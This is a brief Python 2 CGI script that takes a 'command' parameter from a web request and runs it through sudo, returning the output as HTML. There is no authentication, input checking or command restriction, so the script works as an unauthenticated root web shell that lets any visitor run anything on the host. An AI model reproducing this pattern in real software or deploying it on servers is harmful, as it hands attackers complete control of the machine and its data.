#!/usr/bin/python2
import cgi,commands
print "content-type:text/html"
print ""
data=cgi.FieldStorage()
cmd=data.getvalue('command')
print "<b>"
print "<pre>"
print commands.getoutput('sudo '+cmd)
print "</pre>"
print "</b>"
